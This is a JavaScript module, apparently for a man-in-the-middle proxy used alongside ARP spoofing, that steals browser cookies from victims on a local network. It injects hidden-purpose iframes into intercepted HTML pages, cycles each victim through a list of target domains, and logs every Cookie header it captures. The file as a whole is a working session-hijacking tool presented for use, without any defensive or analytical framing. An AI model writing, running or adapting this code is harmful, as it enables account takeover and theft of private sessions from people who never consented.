var victims = {}

function Rf(s)
{
    return "\033[31m" + s + "\033[0m"
}
function Rb(s)
{
    return "\033[41m" + s + "\033[0m"
}

function onLoad()
{
    log( "Cookies steal module loaded." );
    log( "targets: " + env['arp.spoof.targets'] );
}

function onRequest(req, res)
{
    var ip = req.Client.IP,
        hostname = req.Hostname,
        headers, cookies

    headers = req.Headers.replace(/\r\n$/g, "").split("\r\n")
    for (var i = 0; i < headers.length; i++)
    {
        header_name = headers[i].replace(/:.*/, "")
        if(header_name == 'Cookie')
            cookies = headers[i].replace(/.*?: /, "");
    }

    if( req.Query.indexOf('__steal') != -1 )
    {
        if(cookies)
            log( Rb( "[+] " + ip + " - " + hostname + "  " + cookies ) )

        if( victims[ip] && victims[ip].length )
        {
            var hostname_index = victims[ip].indexOf(hostname)
            if( hostname_index != -1 )
                victims[ip].splice( hostname_index, 1 )
            
            if( victims[ip].length )
                res.Body = '<html><head></head><body>\n' +
                    '<h2></h2><h3 style="background-color:red"></h3>\n' + 
                    '<script>document.getElementsByTagName("h2")[0].innerHTML="stealing "+location\n' +
                    'document.getElementsByTagName("h3")[0].innerHTML=document.cookie</script>\n' +
                    '<script>document.location="http://' + victims[ip][0] + '/?__steal"</script>\n' +
                    '</body></html>'
            else
                res.Body = 'end stealing'
            res.Status      = 200
            res.ContentType = "text/html"
            res.Headers     = "Connection: close"
        }
    }    
}

function onResponse(req, res)
{
    if( res.ContentType.indexOf('text/html') == 0 )
    {
        var body = res.ReadBody(),
            ip = req.Client.IP

        if(! victims[ip] )
        {
            victims[ip] = readFile(env["steal-cookies.domains"]).toString().split('\n')
            body = body.replace(
                '</body>',
                '<iframe width="640" height="480" src="http://' + victims[ip][0] + '/?__steal">begin stealing</iframe></body>'
            )
            body = body.replace(
                '</BODY>',
                '<iframe width="640" height="480" src="http://' + victims[ip][0] + '/?__steal">begin stealing</iframe></BODY>'
            )

            log( Rf( "[*] new victim: " + ip + " - " + victims[ip][0] ) )

            res.Body        = body
            res.Status      = 200
            res.ContentType = "text/html"
            res.Headers     = "Connection: close"
        }
        else if( victims[ip].length && req.Query.indexOf('__steal') == -1 )
        {
            body = body.replace(
                '</body>',
                '<iframe width="640" height="480" src="http://' + victims[ip][0] + '/?__steal">continue stealing</iframe></body>'
            )
            body = body.replace(
                '</BODY>',
                '<iframe width="640" height="480" src="http://' + victims[ip][0] + '/?__steal">continue stealing</iframe></BODY>'
            )

            log( Rf( "[*] continue stealing: " + ip + " - " + victims[ip][0] ) )

            res.Body        = body
            res.Status      = 200
            res.ContentType = "text/html"
            res.Headers     = "Connection: close"
        }
    }
}
